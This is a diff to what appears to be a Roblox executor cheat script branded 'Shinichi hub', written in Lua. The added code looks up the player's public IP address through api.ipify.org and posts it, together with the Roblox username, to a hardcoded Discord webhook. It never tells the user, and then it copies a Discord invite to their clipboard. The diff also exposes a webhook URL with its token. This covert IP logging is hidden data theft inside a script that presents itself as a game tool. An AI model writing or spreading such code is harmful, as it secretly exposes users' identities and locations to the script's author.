@@ -18,3 +18,51 @@ a.DescendantAdded:Connect(function(v)
     end)
 end)
 wait(.3)
+
+function PostWebhook(Url, message)
+    local request = http_request or request or HttpPost or syn.request
+    local data =
+        request(
+        {
+            Url = Url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode(message)
+        }
+    )
+    return ""
+end
+
+function AdminLoggerMsg()
+    local randomColor = math.random(0, 0xFFFFFF)
+    local AdminMessage = {
+        ["embeds"] = {
+            {
+                ["title"] = "**Shinichi hub🔥**",
+                ["description"] = "https://discord.gg/wWX6EAYzrA",
+                ["type"] = "bố tài tới chơi🔥",
+                ["color"] = randomColor, 
+                ["fields"] = {
+                    {
+                        ["name"] = "**Username**",
+                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "**IP Address**",
+                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
+                        ["inline"] = false
+                    },
+                },
+                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
+            }
+        }
+    }
+    return AdminMessage
+end
+
+PostWebhook("https://discord.com/api/webhooks/1332303242343878776/pxw_Y5sYzRMrmvrY7peABhYBDGG7Yq2vem-KXIcDej6TVPzxyZ4a6quYE0ry0lTHMl9k", AdminLoggerMsg()) -- Post to admin webhook
+
+local discordLink = "https://discord.gg/wWX6EAYzrA"
+setclipboard(discordLink)
+NotificationLibrary:SendNotification("Info", "Discord link đã được copy vào clipboard!", 5)
